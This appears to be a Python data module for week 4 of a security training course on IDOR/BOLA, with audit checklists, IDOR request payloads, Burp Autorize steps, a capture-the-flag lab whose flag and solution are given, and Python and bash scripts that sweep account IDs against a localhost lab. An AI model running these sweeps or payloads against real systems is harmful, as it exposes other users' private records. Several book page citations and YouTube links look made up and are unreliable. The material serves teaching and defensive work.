WEEK_4_DATA = {
    "week_number": 4,
    "title": "IDOR & Broken Object Level Authentication (BOLA)",
    "short_desc": "Exploit direct object references, manipulate REST API parameters, and harvest unauthorized account records.",
    "flag": "FLAG{idor_bola_object_access_4812}",

    "analogy": """IDOR / BOLA is like staying at a hotel where your keycard is printed with your room number '101'. You walk down the hallway to room '102', put your keycard against their door, and the door unlocks because the lock only checks if your keycard is physically real, not whether you actually rented room 102!""",

    "overview": """Insecure Direct Object References (IDOR), classified by OWASP API Security as Broken Object Level Authentication (BOLA), occur when an application uses client-supplied input (such as database integer IDs, UUIDs, or usernames) to access database records without verifying that the requesting user holds authorization for that specific object. Attackers substitute parameter values (e.g., changing `/api/v1/download?invoice_id=1001` to `1002`) to view, modify, or delete confidential records belonging to other tenants.""",

    "learning_objectives": [
        "Identify numeric, UUID, and hash-based direct object references in HTTP requests.",
        "Differentiate between read IDOR, write/update IDOR, and administrative execution IDOR.",
        "Automate parameter tampering using Burp Suite Intruder and Autorize extension.",
        "Design object-level ownership checks and tenant authorization middleware."
    ],

    "hunters_perspective": """IDOR/BOLA is the single most lucrative vulnerability category in modern bug bounty programs. Because modern single-page applications heavily rely on REST and GraphQL APIs, nearly every API endpoint accepts object identifiers (`user_id`, `account_id`, `document_guid`, `org_id`). Hunters create two distinct user accounts (User A and User B), capture User A's API request in Burp Suite, substitute User A's session token with User B's session token, and check if User B can access User A's private data.""",

    "root_cause": """The root cause is missing object-level access control checks in backend controller methods. Developers frequently check whether a user is logged in (`request.user.is_authenticated`), but fail to check if the record's ownership matches the authenticated user: `Document.objects.get(id=request.GET['id'])` instead of `Document.objects.get(id=request.GET['id'], owner=request.user)`.""",

    "code_audit_manual": """Code Audit Checklist for IDOR/BOLA:
1. Search codebase for SQL queries or ORM calls fetching objects directly from request parameters without checking `owner_id`.
2. Inspect API routes accepting identifiers: `/users/{id}`, `/api/orders/{order_id}/pdf`, `/profile/settings?account_id=123`.
3. Check GraphQL queries and mutations accepting input arguments like `node(id: "...")`.
4. Verify if GUIDs/UUIDs are relied upon as security-by-obscurity (UUIDs can be leaked through logs or sub-queries).
5. Audit HTTP methods: test `GET`, `PUT`, `PATCH`, `DELETE` operations on target object parameters.""",

    "payload_logic": {
        "explanation": "IDOR payloads involve parameter replacement, array wrapping, HTTP parameter pollution (HPP), and JSON property injection.",
        "payloads": [
            "GET /api/v1/user/profile?id=1001 -> GET /api/v1/user/profile?id=1002",
            "POST /api/v1/invoices/download Body: {\"invoice_id\": 5001} -> {\"invoice_id\": 5002}",
            "HTTP Parameter Pollution: GET /api/v1/account?user_id=attacker_id&user_id=victim_id",
            "JSON Array Injection: {\"user_ids\": [1001, 1002, 1003]}"
        ]
    },

    "burp_suite_masterclass": """Burp Suite Autorize Masterclass for IDOR Testing:
1. Extension Installation: Install 'Autorize' from the Burp BApp Store.
2. Configuration: Log in as User A (high-privilege/victim). Copy User B's (low-privilege/attacker) Authorization header / session cookies into Autorize settings.
3. Turn Autorize ON: Browse the web application as User A.
4. Analyzing Results: Autorize automatically re-sends every request using User B's cookies and compares response lengths and HTTP status codes.
5. Highlighting Bugs: Filter for 'Bypassed!' (Red) status in Autorize table to instantly spot IDOR/BOLA flaws.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Map all REST/GraphQL API endpoints. Intercept target object IDs, systematically iterate IDs using Burp Intruder, dump private user PII, modify user emails to take over accounts, delete arbitrary database objects.",
        "blue_team": "Defensive Posture: Implement mandatory authorization checks at the data model / repository layer. Replace auto-incrementing integer IDs with unpredictable UUID v4 strings. Enforce Tenant Isolation middleware ensuring `object.user_id == current_user.id` on every query."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - Insecure Direct Object References (IDOR)",
        "portswigger_url": "https://portswigger.net/web-security/access-control/idor",
        "owasp_title": "OWASP API Security Top 10 - API1:2023 Broken Object Level Authentication",
        "owasp_url": "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authentication/"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 8: Attacking Access Controls (pp. 257-290)",
            "sub_chapter": "8.2 Insecure Direct Object References",
            "analysis": "Stuttard & Pinto explore access control design paradigms, direct parameter manipulation, and horizontal vs. vertical privilege escalations."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 8: Insecure Direct Object References (pp. 135-158)",
            "sub_chapter": "8.3 Automating IDOR Discovery with Autorize",
            "analysis": "Vickie Li demonstrates setting up multi-account testing workflows in Burp Suite to uncover read and write IDORs in single-page apps."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 3: Insecure Direct Object References (pp. 49-72)",
            "sub_chapter": "3.2 Finding IDORs in REST APIs",
            "analysis": "Peter Yaworski reviews disclosed bug bounty writeups where simple parameter increments exposed millions of private user documents."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 5: API Security Auditing (pp. 79-98)",
            "sub_chapter": "5.2 Generating IDOR Fuzzing Payloads",
            "analysis": "Barbosa shows how to use AI models to construct parameter variation matrices for complex JSON REST payloads."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 6: API Vulnerabilities & BOLA (pp. 121-145)",
            "sub_chapter": "6.1 Exploiting Broken Object Level Auth",
            "analysis": "Vazquez & Javier walk through identifying subtle IDORs in GraphQL mutations and backend microservice proxies."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 12: Working with APIs (pp. 280-300)",
            "sub_chapter": "12.4 Automated HTTP GET Parameter Iteration",
            "analysis": "Sweigart provides practical Python code for iterating numerical IDs in GET requests and saving JSON responses."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 5: Web Attack Automation (pp. 75-98)",
            "sub_chapter": "5.3 Multithreaded API Parameter Tampering",
            "analysis": "Seitz demonstrates building multi-threaded Python scripts to fuzz API object endpoints concurrently."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "IDOR / BOLA Vulnerabilities Explained for Beginners",
            "youtube_url": "https://www.youtube.com/watch?v=4-4-u0i-H-7",
            "analysis_text": "David Bombal explains the mechanics of IDORs in modern web applications, demonstrating how changing an ID in a browser URL leaks user records."
        },
        {
            "creator": "Vickie Li",
            "title": "Mastering IDOR Bug Bounties: Step-by-Step",
            "youtube_url": "https://www.youtube.com/watch?v=6-s5e5c7W-7",
            "analysis_text": "Vickie Li demonstrates finding subtle IDOR vectors in HTTP POST requests, JSON parameters, and sub-object arrays."
        },
        {
            "creator": "Ryan John",
            "title": "API Hacking & BOLA Exploitation Guide",
            "youtube_url": "https://www.youtube.com/watch?v=0-v3u-4-W-1",
            "analysis_text": "Ryan John presents a complete workflow for using Autorize and Turbo Intruder to discover BOLA bugs across complex enterprise APIs."
        },
        {
            "creator": "John Hammond",
            "title": "Finding & Exploiting IDOR Vulnerabilities in Production",
            "youtube_url": "https://www.youtube.com/watch?v=1-w3u-5-X-2",
            "analysis_text": "John Hammond performs a live walkthrough exploiting an IDOR flaw on an e-commerce target to access private billing invoices."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "Twitter Bug Bounty Program",
                "title": "IDOR in Direct Message API Exposes Private User Conversations",
                "bounty": "$10,080",
                "summary": "A researcher modified the `conversation_id` parameter in Twitter's REST API, granting unauthorized access to private direct messages of arbitrary accounts."
            },
            {
                "target": "US DoD VDP",
                "title": "BOLA in Personnel Management System Leaks Service Records",
                "bounty": "Disclosed / Wall of Fame",
                "summary": "Analyst manipulated integer parameters in `/api/personnel/view?id=8812` to dump military personnel records across multiple units."
            }
        ],
        "programs": [
            {
                "name": "Twitter / X Bug Bounty",
                "platform": "HackerOne",
                "scope": "api.twitter.com",
                "beginner_friendly": True
            },
            {
                "name": "Vimeo Vulnerability Rewards",
                "platform": "HackerOne",
                "scope": "api.vimeo.com",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for IDOR Analysis: Feed API endpoints and JSON bodies to ChatGPT: 'Analyze this REST API request and backend controller snippet. Identify parameter tampered candidates (IDOR/BOLA) and write a Python requests script to test horizontal privilege escalation: [INSERT CODE]'"
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Examine the API request `GET /api/user/record?user_id=101`. Notice that changing `user_id=101` to `user_id=102` returns another user's private data without checking permissions.",
            "guided_step": "Step 1: Send GET request to `/lab-playground/week-4/target/?account_id=1002`.\nStep 2: Inspect response JSON for field `secret_flag`.\nStep 3: Extract Flag: FLAG{idor_bola_object_access_4812}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-4/target/`. Iterate direct object parameters to bypass ownership checks and capture the flag."
        }
    },

    "automation_scripts": {
        "python_script": """# Python IDOR / BOLA Parameter Tamperer (exploit_week4.py)
import requests
import sys

def test_idor_range(base_url, start_id=1000, end_id=1005):
    print(f"[*] Testing IDOR parameter sweep on: {base_url}")
    for account_id in range(start_id, end_id + 1):
        url = f"{base_url}?account_id={account_id}"
        res = requests.get(url)
        print(f"[*] Testing ID {account_id} -> Status: {res.status_code}")
        if "FLAG{" in res.text:
            print(f"[!] SUCCESS: IDOR Flag Discovered at account_id={account_id}")
            print(f"    - Body: {res.text.strip()}")
            return

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-4/target/"
    test_idor_range(target)
""",
        "bash_script": """#!/bin/bash
# Bash IDOR Parameter Sweeper (recon_week4.sh)
TARGET_URL="http://localhost:8000/lab-playground/week-4/target/"

echo "[*] Sweeping account_id range 1000..1005 on $TARGET_URL"
for id in $(seq 1000 1005); do
    res=$(curl -s "${TARGET_URL}?account_id=${id}")
    echo "[+] Testing ID $id..."
    echo "$res" | grep -i "FLAG{" && break
done
"""
    }
}
